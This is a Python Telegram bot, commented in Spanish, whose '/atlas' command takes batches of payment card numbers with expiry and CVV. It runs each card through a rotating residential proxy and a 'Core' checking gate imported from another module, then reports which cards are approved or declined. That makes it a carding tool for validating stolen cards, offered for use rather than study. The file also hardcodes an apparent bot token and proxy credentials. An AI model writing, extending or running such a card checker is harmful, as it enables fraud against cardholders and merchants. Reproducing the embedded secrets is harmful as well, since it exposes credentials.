import os, sys, time, subprocess, random, re, base64, json, logging, threading
from datetime import datetime as dt
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from faker import Faker
from colorama import init

init(autoreset=True)
fake = Faker('es_MX')

TELEGRAM_TOKEN = "8509265501:AAEMAHVgn9s2SQOGKOXp67izXsk_91F1Cws"
bot = telebot.TeleBot(TELEGRAM_TOKEN, threaded=True, num_threads=10)

logging.basicConfig(level=logging.INFO, format="[%(asctime)s] %(levelname)s: %(message)s")

def obtener_proxy_rotativo():
    PROXIES_IPROYAL = [
        "geo.iproyal.com:12321:R6aQQtnCK6WMFbkh:P00BYvhRpkmEiywX_country-mx_session-IiV4Z9zo_lifetime-168h",
        # Agrega aquí tus proxies completos
    ]
    proxy_crudo = random.choice(PROXIES_IPROYAL)
    host, port, user, pwd = proxy_crudo.split(":")
    return f"http://{user}:{pwd}@{host}:{port}"

from estrella_roja import Core  # Importa la clase Core del otro archivo

import time

@bot.message_handler(commands=['atlas'])
def cmd_atlas(message):
    chat_id = message.chat.id
    texto = message.text.replace("/atlas", "").strip()
    tarjetas = [line.strip() for line in texto.splitlines() if re.match(r"\d{13,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}", line)]
    if not tarjetas:
        bot.reply_to(message, "⚠️ Envía las tarjetas en formato:\n`numero|mm|yyyy|cvv`\nPuedes enviar varias líneas.", parse_mode="Markdown")
        return

    msg_estado = bot.send_message(chat_id, f"🚀 Procesando lote Estrella Roja ({len(tarjetas)} tarjetas)...")

    def run_batch():
        resultados = []
        for i, cc in enumerate(tarjetas, 1):
            try:
                proxy = obtener_proxy_rotativo()
                gate = Core(card=cc, proxy=proxy)
                res = gate.json()
                estado = "✅ APROBADA" if res.get('success') else "❌ DECLINADA"
                mensaje = f"{estado}\nTarjeta: {res.get('card')}\nMensaje: {res.get('message')}\n"
            except Exception as e:
                mensaje = f"❌ Error procesando: {cc}\n{str(e)}"
            resultados.append(mensaje)
            try:
                bot.edit_message_text(f"🚀 Procesando tarjeta {i}/{len(tarjetas)}", chat_id, msg_estado.message_id)
            except:
                pass
            time.sleep(3)
        for r in resultados:
            bot.send_message(chat_id, r)
        try:
            bot.edit_message_text(f"🎉 Lote Estrella Roja completado.", chat_id, msg_estado.message_id)
        except:
            pass

    threading.Thread(target=run_batch, daemon=True).start()

if __name__ == "__main__":
    print("🤖 CDPS SYSTEM AI Bot iniciado.")
    bot.infinity_polling()
